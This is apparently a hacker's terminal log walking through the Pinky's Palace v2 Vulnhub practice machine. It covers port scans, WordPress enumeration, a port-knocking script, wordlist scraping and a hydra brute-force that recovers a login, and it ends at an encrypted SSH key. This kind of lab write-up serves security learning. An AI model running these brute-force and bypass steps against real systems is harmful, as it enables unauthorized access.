-- STINKY PINKYS PALACE DUECE --

root@7242-alpha-reticuli:~# nmap -sT -sV -A 192.168.1.119
Starting Nmap 7.70 ( https://nmap.org ) at 2018-06-09 07:56 CDT
Nmap scan report for Pinkys-Palace.attlocal.net (192.168.1.119)
Host is up (0.00079s latency).
Not shown: 998 closed ports
PORT      STATE    SERVICE VERSION
80/tcp    open     http    Apache httpd 2.4.25 ((Debian))
|_http-generator: WordPress 4.9.4
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Pinky&#039;s Blog &#8211; Just another WordPress site
31337/tcp filtered Elite
MAC Address: 00:E1:8C:DC:08:BB (Intel Corporate)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   0.79 ms Pinkys-Palace.attlocal.net (192.168.1.119)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.66 seconds
root@7242-alpha-reticuli:~# 


root@7242-alpha-reticuli:~# cat /etc/hosts | grep pink
192.168.1.119 pinkys-palace.attlocal.net	pinkys-palace 
192.168.1.119 pinkydb
root@7242-alpha-reticuli:~# 

08:05:53-cdowns@7242-alpha-reticuli:~/Github/nikto/program$ ./nikto.pl -host 192.168.1.119 -vhost http://pinkydb/
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.1.119
+ Target Hostname:    192.168.1.119
+ Target Port:        80
+ Virtual Host:       http://pinkydb/
+ Start Time:         2018-06-09 08:06:16 (GMT-5)
---------------------------------------------------------------------------
+ Server: Apache/2.4.25 (Debian)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ ///etc/hosts: The server install allows reading of any system file by adding an extra '/' to the URL.
+ 7536 requests: 0 error(s) and 4 item(s) reported on remote host
+ End Time:           2018-06-09 08:06:33 (GMT-5) (17 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested


      *********************************************************************
      Portions of the server's headers (Apache/2.4.25) are not in
      the Nikto database or are newer than the known string. Would you like
      to submit this information (*no server specific data*) to CIRT.net
      for a Nikto update (or you may email to sullo@cirt.net) (y/n)? y

+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ ERROR 302: Update failed, please notify sullo@cirt.net of this code.
08:06:42-cdowns@7242-alpha-reticuli:~/Github/nikto/program$ 


08:08:23-cdowns@7242-alpha-reticuli:~/Github/nikto/program$ dirb http://pinkysdb -f

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sat Jun  9 08:08:28 2018
URL_BASE: http://pinkysdb/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
OPTION: Fine tunning of NOT_FOUND detection

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://pinkysdb/ ----
+ http://pinkysdb/.swf (CODE:302|SIZE:154)                                                                                                                                                    
+ http://pinkysdb/_vti_bin/_vti_adm/admin.dll (CODE:302|SIZE:154)                                                                                                                             
+ http://pinkysdb/_vti_bin/_vti_aut/author.dll (CODE:302|SIZE:154)                                                                                                                            
+ http://pinkysdb/_vti_bin/shtml.dll (CODE:302|SIZE:154)                                                                                                                                      
+ http://pinkysdb/alumni (CODE:200|SIZE:1)                                                                                                                                                    
+ http://pinkysdb/alumni_add (CODE:200|SIZE:1)                                                                                                                                                
+ http://pinkysdb/alumni_details (CODE:200|SIZE:1)                                                                                                                                            
+ http://pinkysdb/alumni_info (CODE:200|SIZE:1)                                                                                                                                               
+ http://pinkysdb/alumni_reunions (CODE:200|SIZE:1)                                                                                                                                           
+ http://pinkysdb/alumni_update (CODE:200|SIZE:1)                                                                                                                                             
+ http://pinkysdb/am (CODE:200|SIZE:1)                                                                                                                                                        
+ http://pinkysdb/amanda (CODE:200|SIZE:1)                                                                                                                                                    
+ http://pinkysdb/amazon (CODE:200|SIZE:1)                                                                                                                                                    
+ http://pinkysdb/amember (CODE:200|SIZE:1)                                                                                                                                                   
+ http://pinkysdb/analog (CODE:200|SIZE:1)                                                                                                                                                    
+ http://pinkysdb/analyse (CODE:200|SIZE:1)                                                                                                                                                   
+ http://pinkysdb/analysis (CODE:200|SIZE:1)                                                                                                                                                  
+ http://pinkysdb/analytics (CODE:200|SIZE:1)                                                                                                                                                 
+ http://pinkysdb/and (CODE:200|SIZE:1)                                                                                                                                                       
+ http://pinkysdb/android (CODE:200|SIZE:1)                                                                                                                                                   
+ http://pinkysdb/announce (CODE:200|SIZE:1)                                                                                                                                                  
+ http://pinkysdb/announcement (CODE:200|SIZE:1)                                                                                                                                              
+ http://pinkysdb/announcements (CODE:200|SIZE:1)                                                                                                                                             
+ http://pinkysdb/annuaire (CODE:200|SIZE:1)                                                                                                                                                  
+ http://pinkysdb/annual (CODE:200|SIZE:1)                                                                                                                                                    
+ http://pinkysdb/anon (CODE:200|SIZE:1)                                                                                                                                                      
+ http://pinkysdb/anon_ftp (CODE:200|SIZE:1)                                                                                                                                                  
+ http://pinkysdb/anonymous (CODE:200|SIZE:1)                                                                                                                                                 
+ http://pinkysdb/ansi (CODE:200|SIZE:1)                                                                                                                                                      
+ http://pinkysdb/answer (CODE:200|SIZE:1)                                                                                                                                                    
+ http://pinkysdb/answers (CODE:200|SIZE:1)                                                                                                                                                   
+ http://pinkysdb/antibot_image (CODE:200|SIZE:1)                                                                                                                                             
+ http://pinkysdb/antispam (CODE:200|SIZE:1)                                                                                                                                                  
+ http://pinkysdb/antivirus (CODE:200|SIZE:1)                                                                                                                                                 
+ http://pinkysdb/anuncios (CODE:200|SIZE:1)                                                                                                                                                  
+ http://pinkysdb/any (CODE:200|SIZE:1)                                                                                                                                                       
+ http://pinkysdb/aol (CODE:200|SIZE:1)                                                                                                                                                       
+ http://pinkysdb/ap (CODE:200|SIZE:1)                                                                                                                                                        
+ http://pinkysdb/apac (CODE:200|SIZE:1)                                                                                                                                                      
+ http://pinkysdb/apache (CODE:200|SIZE:1)                                                                                                                                                    
+ http://pinkysdb/apanel (CODE:200|SIZE:1)                                                                                                                                                    
+ http://pinkysdb/apc (CODE:200|SIZE:1)                                                                                                                                                       
+ http://pinkysdb/apexec (CODE:200|SIZE:1)                                                                                                                                                    
+ http://pinkysdb/api (CODE:200|SIZE:1)                                                                                                                                                       
+ http://pinkysdb/apis (CODE:200|SIZE:1)                                                                                                                                                      
+ http://pinkysdb/apl (CODE:200|SIZE:1)                                                                                                                                                       
+ http://pinkysdb/apm (CODE:200|SIZE:1)                                                                                                                                                       
+ http://pinkysdb/app (CODE:200|SIZE:1)                                                                                                                                                       
+ http://pinkysdb/app_browser (CODE:200|SIZE:1)                                                                                                                                               
+ http://pinkysdb/app_browsers (CODE:200|SIZE:1)                                                                                                                                              
+ http://pinkysdb/app_code (CODE:200|SIZE:1)                                                                                                                                                  
+ http://pinkysdb/app_data (CODE:200|SIZE:1)                                                                                                                                                  
+ http://pinkysdb/app_themes (CODE:200|SIZE:1)                                                                                                                                                
+ http://pinkysdb/appeal (CODE:200|SIZE:1)                                                                                                                                                    
+ http://pinkysdb/appeals (CODE:200|SIZE:1)                                                                                                                                                   
+ http://pinkysdb/append (CODE:200|SIZE:1)                                                                                                                                                    
+ http://pinkysdb/appl (CODE:200|SIZE:1)                                                                                                                                                      
+ http://pinkysdb/apple (CODE:200|SIZE:1)                                                                                                                                                     
+ http://pinkysdb/applet (CODE:200|SIZE:1)                                                                                                                                                    
+ http://pinkysdb/applets (CODE:200|SIZE:1)                                                                                                                                                   
+ http://pinkysdb/appliance (CODE:200|SIZE:1)                                                                                                                                                 
+ http://pinkysdb/appliation (CODE:200|SIZE:1)                                                                                                                                                
+ http://pinkysdb/application (CODE:200|SIZE:1)                                                                                                                                               
+ http://pinkysdb/application.wadl (CODE:200|SIZE:1)                                                                                                                                          
+ http://pinkysdb/applications (CODE:200|SIZE:1)                                                                                                                                              
+ http://pinkysdb/apply (CODE:200|SIZE:1)                                                                                                                                                     
+ http://pinkysdb/apps (CODE:200|SIZE:1)                                                                                                                                                      
+ http://pinkysdb/AppsLocalLogin (CODE:200|SIZE:1)                                                                                                                                            
+ http://pinkysdb/AppsLogin (CODE:200|SIZE:1)                                                                                                                                                 
+ http://pinkysdb/apr (CODE:200|SIZE:1)                                                                                                                                                       
+ http://pinkysdb/ar (CODE:200|SIZE:1)                                                                                                                                                        
+ http://pinkysdb/arbeit (CODE:200|SIZE:1)                                                                                                                                                    
+ http://pinkysdb/arcade (CODE:200|SIZE:1)                                                                                                                                                    
+ http://pinkysdb/arch (CODE:200|SIZE:1)                                                                                                                                                      
+ http://pinkysdb/architect (CODE:200|SIZE:1)                                                                                                                                                 
+ http://pinkysdb/architecture (CODE:200|SIZE:1)                                                                                                                                              
+ http://pinkysdb/archiv (CODE:200|SIZE:1)                                                                                                                                                    
+ http://pinkysdb/archive (CODE:200|SIZE:1)                                                                                                                                                   
+ http://pinkysdb/Archive (CODE:200|SIZE:1)                                                                                                                                                   
+ http://pinkysdb/archives (CODE:200|SIZE:1)                                                                                                                                                  
+ http://pinkysdb/archivos (CODE:200|SIZE:1)                                                                                                                                                  
+ http://pinkysdb/arquivos (CODE:200|SIZE:1)                                                                                                                                                  
+ http://pinkysdb/array (CODE:200|SIZE:1)                                                                                                                                                     
+ http://pinkysdb/arrow (CODE:200|SIZE:1)                                                                                                                                                     
+ http://pinkysdb/ars (CODE:200|SIZE:1)                                                                                                                                                       
+ http://pinkysdb/art (CODE:200|SIZE:1)                                                                                                                                                       
+ http://pinkysdb/article (CODE:200|SIZE:1)                                                                                                                                                   
+ http://pinkysdb/articles (CODE:200|SIZE:1)                                                                                                                                                  
+ http://pinkysdb/Articles (CODE:200|SIZE:1)                                                                                                                                                  
+ http://pinkysdb/artikel (CODE:200|SIZE:1)                                                                                                                                                   
+ http://pinkysdb/artists (CODE:200|SIZE:1)                                                                                                                                                   
+ http://pinkysdb/arts (CODE:200|SIZE:1)                                                                                                                                                      
+ http://pinkysdb/artwork (CODE:200|SIZE:1)                                                                                                                                                   
+ http://pinkysdb/as (CODE:200|SIZE:1)                                                                                                                                                        
+ http://pinkysdb/ascii (CODE:200|SIZE:1)                                                                                                                                                     
+ http://pinkysdb/asdf (CODE:200|SIZE:1)                                                                                                                                                      
+ http://pinkysdb/ashley (CODE:200|SIZE:1)                                                                                                                                                    
+ http://pinkysdb/asia (CODE:200|SIZE:1)                                                                                                                                                      
+ http://pinkysdb/ask (CODE:200|SIZE:1)                                                                                                                                                       
+ http://pinkysdb/ask_a_question (CODE:200|SIZE:1)                                                                                                                                            
+ http://pinkysdb/askapache (CODE:200|SIZE:1)                                                                                                                                                 
(!) WARNING: Too many responses for this directory seem to be FOUND.                                                                                                                          
    (Something is going wrong - Try Other Scan Mode)
    (Use mode '-w' if you want to scan it anyway)
                                                                               
-----------------
END_TIME: Sat Jun  9 08:09:23 2018
DOWNLOADED: 484 - FOUND: 101
08:09:23-cdowns@7242-alpha-reticuli:~/Github/nikto/program$ 


UHMMM OK ? --

root@7242-alpha-reticuli:~# wpscan -u http://pinkydb -e utp
_______________________________________________________________
        __          _______   _____                  
        \ \        / /  __ \ / ____|                 
         \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
          \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \ 
           \  /\  /  | |     ____) | (__| (_| | | | |
            \/  \/   |_|    |_____/ \___|\__,_|_| |_|

        WordPress Security Scanner by the WPScan Team 
                       Version 2.9.3
          Sponsored by Sucuri - https://sucuri.net
   @_WPScan_, @ethicalhack3r, @erwan_lr, pvdl, @_FireFart_
_______________________________________________________________

[+] URL: http://pinkydb/
[+] Started: Sat Jun  9 08:27:43 2018

[!] The WordPress 'http://pinkydb/readme.html' file exists exposing a version number
[+] Interesting header: LINK: <http://pinkydb/index.php?rest_route=/>; rel="https://api.w.org/"
[+] Interesting header: SERVER: Apache/2.4.25 (Debian)
[+] XML-RPC Interface available under: http://pinkydb/xmlrpc.php
[!] Includes directory has directory listing enabled: http://pinkydb/wp-includes/

[+] WordPress version 4.9.4 (Released on 2018-02-06) identified from meta generator, links opml
[!] 4 vulnerabilities identified from the version number

[!] Title: WordPress <= 4.9.4 - Application Denial of Service (DoS) (unpatched)
    Reference: https://wpvulndb.com/vulnerabilities/9021
    Reference: https://baraktawily.blogspot.fr/2018/02/how-to-dos-29-of-world-wide-websites.html
    Reference: https://github.com/quitten/doser.py
    Reference: https://thehackernews.com/2018/02/wordpress-dos-exploit.html
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-6389

[!] Title: WordPress 3.7-4.9.4 - Remove localhost Default
    Reference: https://wpvulndb.com/vulnerabilities/9053
    Reference: https://wordpress.org/news/2018/04/wordpress-4-9-5-security-and-maintenance-release/
    Reference: https://github.com/WordPress/WordPress/commit/804363859602d4050d9a38a21f5a65d9aec18216
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10101
[i] Fixed in: 4.9.5

[!] Title: WordPress 3.7-4.9.4 - Use Safe Redirect for Login
    Reference: https://wpvulndb.com/vulnerabilities/9054
    Reference: https://wordpress.org/news/2018/04/wordpress-4-9-5-security-and-maintenance-release/
    Reference: https://github.com/WordPress/WordPress/commit/14bc2c0a6fde0da04b47130707e01df850eedc7e
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10100
[i] Fixed in: 4.9.5

[!] Title: WordPress 3.7-4.9.4 - Escape Version in Generator Tag
    Reference: https://wpvulndb.com/vulnerabilities/9055
    Reference: https://wordpress.org/news/2018/04/wordpress-4-9-5-security-and-maintenance-release/
    Reference: https://github.com/WordPress/WordPress/commit/31a4369366d6b8ce30045d4c838de2412c77850d
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10102
[i] Fixed in: 4.9.5

[+] WordPress theme in use: twentyseventeen - v1.4

[+] Name: twentyseventeen - v1.4
 |  Last updated: 2018-05-17T00:00:00.000Z
 |  Location: http://pinkydb/wp-content/themes/twentyseventeen/
 |  Readme: http://pinkydb/wp-content/themes/twentyseventeen/README.txt
[!] The version is out of date, the latest version is 1.6
 |  Style URL: http://pinkydb/wp-content/themes/twentyseventeen/style.css
 |  Theme Name: Twenty Seventeen
 |  Theme URI: https://wordpress.org/themes/twentyseventeen/
 |  Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a...
 |  Author: the WordPress team
 |  Author URI: https://wordpress.org/

[+] Enumerating plugins from passive detection ...
[+] No plugins found

[+] Enumerating usernames ...
[+] Identified the following 1 user/s:
    +----+-----------+---------------------+
    | Id | Login     | Name                |
    +----+-----------+---------------------+
    | 1  | pinky1337 | pinky1337 – Pinky's |
    +----+-----------+---------------------+

[+] Finished: Sat Jun  9 08:27:46 2018
[+] Requests Done: 399
[+] Memory used: 39.656 MB
[+] Elapsed time: 00:00:03
root@7242-alpha-reticuli:~# wpscan -u http://pinkydb --wordlist /usr/share/wordlists/rockyou.txt --username pinky1337
RUNNING ---

Arahcni Audit running another term --

08:41:32-cdowns@7242-alpha-reticuli:~/Github/dirbuster-ng$ curl http://pinkydb/secret/bambam.txt
8890
7000
666

pinkydb
08:42:01-cdowns@7242-alpha-reticuli:~/Github/dirbuster-ng$ 

PORT KNOCKING !!!! --

Quick Rescan !! --

root@7242-alpha-reticuli:~# nmap -sT -sV -p- 192.168.1.119 
Starting Nmap 7.70 ( https://nmap.org ) at 2018-06-09 13:57 CDT
Nmap scan report for pinkys-palace.attlocal.net (192.168.1.119)
Host is up (0.0053s latency).
Not shown: 65531 closed ports
PORT      STATE    SERVICE VERSION
80/tcp    open     http    Apache httpd 2.4.25 ((Debian))
4655/tcp  filtered unknown
7654/tcp  filtered unknown
31337/tcp filtered Elite
MAC Address: 00:E1:8C:DC:08:BB (Intel Corporate)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.08 seconds
root@7242-alpha-reticuli:~# 

OK --

https://github.com/jvinet/knock

Maunual Testing --
We'll script this and attempt to unlock it !! --

root@7242-alpha-reticuli:/home/cdowns/Security# nmap -Pn --host-timeout 100 --max-retries 0 -p 8890,7000,666 192.168.1.119
Starting Nmap 7.70 ( https://nmap.org ) at 2018-06-09 10:42 CDT
Nmap scan report for pinkys-palace.attlocal.net (192.168.1.119)
Host is up (0.00015s latency).

PORT     STATE  SERVICE
666/tcp  closed doom
7000/tcp closed afs3-fileserver
8890/tcp closed ddi-tcp-3
MAC Address: 00:E1:8C:DC:08:BB (Intel Corporate)

Nmap done: 1 IP address (1 host up) scanned in 1.56 seconds
root@7242-alpha-reticuli:/home/cdowns/Security# 

Script --
 
root@7242-alpha-reticuli:/home/cdowns/Security# cat Unlock_PinkysPalace.sh 
#!/bin/bash
 
# https://github.com/jvinet/knock
# Compile and install from github

host="pinkydb"
cmd="/usr/local/bin/knock -v -d 100 $host"  

# ports --
A="8890:tcp"
B="7000:tcp"
C="666:tcp"

# run this bitch --
for i in $A $B $C; do $cmd $i; done
for i in $A $C $B; do $cmd $i; done
for i in $B $A $C; do $cmd $i; done
for i in $B $C $A; do $cmd $i; done
for i in $C $A $B; do $cmd $i; done
for i in $C $B $A; do $cmd $i; done

echo "[+] knock: Finished --"
echo "[+] nmap: Scanning for ports --"

#root@7242-alpha-reticuli:~# nmap -Pn -sT pinkydb -p-
#Starting Nmap 7.70 ( https://nmap.org ) at 2018-06-09 14:13 CDT
#Nmap scan report for pinkydb (192.168.1.119)
#Host is up (0.0049s latency).
#rDNS record for 192.168.1.119: pinkys-palace.attlocal.net
#Not shown: 65531 closed ports
#PORT      STATE    SERVICE
#80/tcp    open     http
#4655/tcp  filtered unknown
#7654/tcp  filtered unknown
#31337/tcp filtered Elite

#Nmap done: 1 IP address (1 host up) scanned in 2.47 seconds
#root@7242-alpha-reticuli:~# 

# We know the ports now --

/usr/bin/nmap -Pn -sT -p 80,4655,7654,31337 $host 
echo "[+] nmap: Finished --"
root@7242-alpha-reticuli:/home/cdowns/Security# 


root@7242-alpha-reticuli:/home/cdowns/Security# ./Unlock_PinkysPalace.sh 
hitting tcp 192.168.1.119:8890
hitting tcp 192.168.1.119:7000
hitting tcp 192.168.1.119:666
hitting tcp 192.168.1.119:8890
hitting tcp 192.168.1.119:666
hitting tcp 192.168.1.119:7000
hitting tcp 192.168.1.119:7000
hitting tcp 192.168.1.119:8890
hitting tcp 192.168.1.119:666
hitting tcp 192.168.1.119:7000
hitting tcp 192.168.1.119:666
hitting tcp 192.168.1.119:8890
hitting tcp 192.168.1.119:666
hitting tcp 192.168.1.119:8890
hitting tcp 192.168.1.119:7000
hitting tcp 192.168.1.119:666
hitting tcp 192.168.1.119:7000
hitting tcp 192.168.1.119:8890
[+] knock: Finished --
[+] nmap: Scanning for ports --
Starting Nmap 7.70 ( https://nmap.org ) at 2018-06-09 14:25 CDT
Nmap scan report for pinkydb (192.168.1.119)
Host is up (0.00033s latency).
rDNS record for 192.168.1.119: pinkys-palace.attlocal.net

PORT      STATE SERVICE
80/tcp    open  http
4655/tcp  open  unknown
7654/tcp  open  unknown
31337/tcp open  Elite

Nmap done: 1 IP address (1 host up) scanned in 0.04 seconds
[+] nmap: Finished --
root@7242-alpha-reticuli:/home/cdowns/Security# 

UNLOCKED !!! 
Let's check it with more detail --


root@7242-alpha-reticuli:~# nmap -sT -sV -sC -A -p- 192.168.1.119 
Starting Nmap 7.70 ( https://nmap.org ) at 2018-06-09 14:28 CDT
Nmap scan report for pinkys-palace.attlocal.net (192.168.1.119)
Host is up (0.0013s latency).
Not shown: 65531 closed ports
PORT      STATE SERVICE VERSION
80/tcp    open  http    Apache httpd 2.4.25 ((Debian))
|_http-generator: WordPress 4.9.4
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Pinky&#039;s Blog &#8211; Just another WordPress site
4655/tcp  open  ssh     OpenSSH 7.4p1 Debian 10+deb9u3 (protocol 2.0)
| ssh-hostkey: 
|   2048 ac:e6:41:77:60:1f:e8:7c:02:13:ae:a1:33:09:94:b7 (RSA)
|   256 3a:48:63:f9:d2:07:ea:43:78:7d:e1:93:eb:f1:d2:3a (ECDSA)
|_  256 b1:10:03:dc:bb:f3:0d:9b:3a:e3:e4:61:03:c8:03:c7 (ED25519)
7654/tcp  open  http    nginx 1.10.3
|_http-server-header: nginx/1.10.3
|_http-title: 403 Forbidden
31337/tcp open  Elite?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, NULL, RPCCheck: 
|     [+] Welcome to The Daemon [+]
|     This is soon to be our backdoor
|     into Pinky's Palace.
|   GetRequest: 
|     [+] Welcome to The Daemon [+]
|     This is soon to be our backdoor
|     into Pinky's Palace.
|     HTTP/1.0
|   HTTPOptions: 
|     [+] Welcome to The Daemon [+]
|     This is soon to be our backdoor
|     into Pinky's Palace.
|     OPTIONS / HTTP/1.0
|   Help: 
|     [+] Welcome to The Daemon [+]
|     This is soon to be our backdoor
|     into Pinky's Palace.
|     HELP
|   RTSPRequest: 
|     [+] Welcome to The Daemon [+]
|     This is soon to be our backdoor
|     into Pinky's Palace.
|     OPTIONS / RTSP/1.0
|   SIPOptions: 
|     [+] Welcome to The Daemon [+]
|     This is soon to be our backdoor
|     into Pinky's Palace.
|     OPTIONS sip:nm SIP/2.0
|     Via: SIP/2.0/TCP nm;branch=foo
|     From: <sip:nm@nm>;tag=root
|     <sip:nm2@nm2>
|     Call-ID: 50000
|     CSeq: 42 OPTIONS
|     Max-Forwards: 70
|     Content-Length: 0
|     Contact: <sip:nm@nm>
|_    Accept: application/sdp
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port31337-TCP:V=7.70%I=7%D=6/9%Time=5B1C2A5D%P=x86_64-pc-linux-gnu%r(NU
SF:LL,59,"\[\+\]\x20Welcome\x20to\x20The\x20Daemon\x20\[\+\]\n\0This\x20is
SF:\x20soon\x20to\x20be\x20our\x20backdoor\n\0into\x20Pinky's\x20Palace\.\
SF:n=>\x20\0")%r(GetRequest,6B,"\[\+\]\x20Welcome\x20to\x20The\x20Daemon\x
SF:20\[\+\]\n\0This\x20is\x20soon\x20to\x20be\x20our\x20backdoor\n\0into\x
SF:20Pinky's\x20Palace\.\n=>\x20\0GET\x20/\x20HTTP/1\.0\r\n\r\n")%r(SIPOpt
SF:ions,138,"\[\+\]\x20Welcome\x20to\x20The\x20Daemon\x20\[\+\]\n\0This\x2
SF:0is\x20soon\x20to\x20be\x20our\x20backdoor\n\0into\x20Pinky's\x20Palace
SF:\.\n=>\x20\0OPTIONS\x20sip:nm\x20SIP/2\.0\r\nVia:\x20SIP/2\.0/TCP\x20nm
SF:;branch=foo\r\nFrom:\x20<sip:nm@nm>;tag=root\r\nTo:\x20<sip:nm2@nm2>\r\
SF:nCall-ID:\x2050000\r\nCSeq:\x2042\x20OPTIONS\r\nMax-Forwards:\x2070\r\n
SF:Content-Length:\x200\r\nContact:\x20<sip:nm@nm>\r\nAccept:\x20applicati
SF:on/sdp\r\n\r\n")%r(GenericLines,5D,"\[\+\]\x20Welcome\x20to\x20The\x20D
SF:aemon\x20\[\+\]\n\0This\x20is\x20soon\x20to\x20be\x20our\x20backdoor\n\
SF:0into\x20Pinky's\x20Palace\.\n=>\x20\0\r\n\r\n")%r(HTTPOptions,6F,"\[\+
SF:\]\x20Welcome\x20to\x20The\x20Daemon\x20\[\+\]\n\0This\x20is\x20soon\x2
SF:0to\x20be\x20our\x20backdoor\n\0into\x20Pinky's\x20Palace\.\n=>\x20\0OP
SF:TIONS\x20/\x20HTTP/1\.0\r\n\r\n")%r(RTSPRequest,6F,"\[\+\]\x20Welcome\x
SF:20to\x20The\x20Daemon\x20\[\+\]\n\0This\x20is\x20soon\x20to\x20be\x20ou
SF:r\x20backdoor\n\0into\x20Pinky's\x20Palace\.\n=>\x20\0OPTIONS\x20/\x20R
SF:TSP/1\.0\r\n\r\n")%r(RPCCheck,5A,"\[\+\]\x20Welcome\x20to\x20The\x20Dae
SF:mon\x20\[\+\]\n\0This\x20is\x20soon\x20to\x20be\x20our\x20backdoor\n\0i
SF:nto\x20Pinky's\x20Palace\.\n=>\x20\0\x80")%r(DNSVersionBindReqTCP,59,"\
SF:[\+\]\x20Welcome\x20to\x20The\x20Daemon\x20\[\+\]\n\0This\x20is\x20soon
SF:\x20to\x20be\x20our\x20backdoor\n\0into\x20Pinky's\x20Palace\.\n=>\x20\
SF:0")%r(DNSStatusRequestTCP,59,"\[\+\]\x20Welcome\x20to\x20The\x20Daemon\
SF:x20\[\+\]\n\0This\x20is\x20soon\x20to\x20be\x20our\x20backdoor\n\0into\
SF:x20Pinky's\x20Palace\.\n=>\x20\0")%r(Help,5F,"\[\+\]\x20Welcome\x20to\x
SF:20The\x20Daemon\x20\[\+\]\n\0This\x20is\x20soon\x20to\x20be\x20our\x20b
SF:ackdoor\n\0into\x20Pinky's\x20Palace\.\n=>\x20\0HELP\r\n");
MAC Address: 00:E1:8C:DC:08:BB (Intel Corporate)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   1.28 ms pinkys-palace.attlocal.net (192.168.1.119)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.76 seconds
root@7242-alpha-reticuli:~# 


root@7242-alpha-reticuli:~# curl http://pinkydb:31337 --output -
[+] Welcome to The Daemon [+]
This is soon to be our backdoor
into Pinky's Palace.
=> GET / HTTP/1.1
Host: pinkydb:31337
User-Agent: curl/7.60.0
Accept: */*

Scrape Site and Generate wordlist --

07:04:36-cdowns@7242-alpha-reticuli:~/Documents/Vulnhub$ cewl -w pinkydb_wordlist.lst -d 5 -m 7 192.168.1.119:7654
CeWL 5.4.3 (Arkanoid) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
07:04:52-cdowns@7242-alpha-reticuli:~/Documents/Vulnhub$ cat pinkydb_wordlist.lst 
07:04:56-cdowns@7242-alpha-reticuli:~/Documents/Vulnhub$ cewl -w pinkydb_wordlist.lst -d 5 -m 7 192.168.1.119
CeWL 5.4.3 (Arkanoid) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
07:05:04-cdowns@7242-alpha-reticuli:~/Documents/Vulnhub$ cat pinkydb_wordlist.lst 
WordPress
content
Comments
another
branding
Passione
Syndication
masthead
everyone
enjoyed
apprezzato
programma
Welcome
writing
primary
Commenter
Archives
Categories
Uncategorized
Entries
secondary
Proudly
powered
colophon
contain
Powered
semantic
personal
publishing
platform
07:05:06-cdowns@7242-alpha-reticuli:~/Documents/Vulnhub$ 

Use It !! --

root@7242-alpha-reticuli:/usr/share/nmap/scripts# hydra -vV -e ns -f -I -t 1 -w 5 -W 1 -l pinky -P /home/cdowns/Documents/Vulnhub/pinkydb_wordlist.lst pinkydb -s 7654 http-post-form "/login.php:user=^USER^&pass=^PASS^&submit=Login:F=Invalid Username or Password!"
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2018-06-10 07:06:14
[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 1 task per 1 server, overall 1 task, 32 login tries (l:1/p:32), ~32 tries per task
[DATA] attacking http-post-form://pinkydb:7654//login.php:user=^USER^&pass=^PASS^&submit=Login:F=Invalid Username or Password!
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[ATTEMPT] target pinkydb - login "pinky" - pass "pinky" - 1 of 32 [child 0] (0/0)
[ATTEMPT] target pinkydb - login "pinky" - pass "" - 2 of 32 [child 0] (0/0)
[ATTEMPT] target pinkydb - login "pinky" - pass "WordPress" - 3 of 32 [child 0] (0/0)
[ATTEMPT] target pinkydb - login "pinky" - pass "content" - 4 of 32 [child 0] (0/0)
[ATTEMPT] target pinkydb - login "pinky" - pass "Comments" - 5 of 32 [child 0] (0/0)
[ATTEMPT] target pinkydb - login "pinky" - pass "another" - 6 of 32 [child 0] (0/0)
[ATTEMPT] target pinkydb - login "pinky" - pass "branding" - 7 of 32 [child 0] (0/0)
[ATTEMPT] target pinkydb - login "pinky" - pass "Passione" - 8 of 32 [child 0] (0/0)
[VERBOSE] Page redirected to http://:7654/pageegap.php?1337=filesselif1001.php
[7654][http-post-form] host: pinkydb   login: pinky   password: Passione
[STATUS] attack finished for pinkydb (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (http://www.thc.org/thc-hydra) finished at 2018-06-10 07:06:34
root@7242-alpha-reticuli:/usr/share/nmap/scripts# 

We are Presented with TWO FILES !! --
Lets crack this Key --

root@7242-alpha-reticuli:/home/cdowns/Documents/Vulnhub# cat notes.txt ; cat id_rsa 
- Stefano
- Intern Web developer
- Created RSA key for security for him to login
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,BAC2C72352E75C879E2F26CC61A5B6E7

